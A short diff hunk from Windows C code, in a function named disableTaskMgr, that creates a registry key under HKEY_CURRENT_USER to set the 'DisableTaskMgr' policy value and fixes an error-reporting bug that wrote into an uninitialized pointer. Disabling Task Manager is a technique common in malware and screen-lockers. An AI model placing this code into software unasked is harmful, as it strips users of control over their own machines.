@@ -17,12 +17,12 @@ bool disableTaskMgr() {
         attrs.nLength = sizeof(SECURITY_ATTRIBUTES);
         attrs.bInheritHandle = TRUE;
 
-        openedKeyWorked = RegCreateKeyExA(HKEY_CURRENT_USER, sk, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, &attrs, &hKey, doneOperation);
+        openedKeyWorked = RegCreateKeyExA(HKEY_CURRENT_USER, sk, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, doneOperation);
 
-        char* errorKeyWorked;
-        sprintf(errorKeyWorked, "%ld", openedKeyWorked);
-
-        if (openedKeyWorked != ERROR_SUCCESS) MessageBoxA(NULL, "Creating Registry System key did not work!", errorKeyWorked, 0);
+        if (openedKeyWorked != ERROR_SUCCESS) {
+            MessageBoxA(NULL, "Creating Registry System key did not work!", "Errore", 0);
+            printf("Error while creating System key: %d", openedKeyWorked);
+        }
     }
     LPCSTR value = TEXT("DisableTaskMgr");
     LPCSTR data = "1\0";
